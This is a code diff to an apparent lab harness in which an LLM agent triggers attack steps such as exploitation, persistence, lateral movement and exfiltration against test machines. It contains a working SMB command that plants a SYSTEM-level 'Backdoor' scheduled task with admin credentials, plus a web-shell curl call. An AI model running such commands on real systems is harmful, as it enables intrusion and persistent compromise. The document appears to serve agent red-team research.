@@ -24,7 +24,6 @@ from ._data import (
     _LAB_SERVICE_PROBES,
     _LAB_SRV,
     _LAB_SRV_VMID,
-    _LAB_SVC_PASS,
     _LAB_VALID_VMIDS,
     _LAB_WEB,
     _STEALTH_EVENT_IDS,
@@ -833,14 +832,29 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         return parse_sandbox_output(r.get("output", ""))[1] or "[exploit: no output]"
 
     if fn_name == "establish_persistence":
-        method = fn_args.get("method", "cron")
-        if method in ("registry", "startup", "service"):
-            cmd = (
-                f"nxc smb {srv} -u svc_backup -p '{_LAB_SVC_PASS}'"
-                f" -x 'schtasks /create /tn Backdoor /tr cmd.exe /sc onlogon /ru SYSTEM /f' 2>&1"
-            )
-        else:
-            cmd = f"echo '[lab] persistence via {method} on {dc}' && date"
+        method = fn_args.get("method", "scheduled_task")
+        # Found live 2026-07-05: this used to gate the REAL command behind a
+        # narrow method-string allowlist ("registry"/"startup"/"service") —
+        # the model is free to call establish_persistence with any label it
+        # likes (e.g. "cron", a Linux concept that has no Windows meaning),
+        # and any value outside that allowlist silently ran a no-op echo
+        # instead of taking a real action. lateral_move/exfiltrate_data below
+        # don't gate on argument-string matching either — establish_persistence
+        # shouldn't be the one exception that goes silent depending on which
+        # word an LLM happened to pick. Always take the real, single supported
+        # persistence action (scheduled task via wmiexec) regardless of the
+        # method label; `method` is recorded for observability only.
+        # Credential: svc_backup cannot execute commands via wmiexec at all
+        # (nxc's WMI-based process creation requires local admin — svc_backup
+        # is a domain service account, not a local admin). By this point in
+        # the chain (after exploit_service's Kerberoast/DCSync), the attack
+        # has already obtained Domain Admin — using administrator here
+        # matches lateral_move/exfiltrate_data's credential choice below and
+        # the scenario's own attack narrative, not a downgrade in realism.
+        cmd = (
+            f"nxc smb {srv} -u administrator -p '{_LAB_ADMIN_PASS}'"
+            f" -x 'schtasks /create /tn Backdoor /tr cmd.exe /sc onlogon /ru SYSTEM /f' 2>&1"
+        )
         if dry_run:
             return f"[DRY-RUN] persistence via {method}"
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
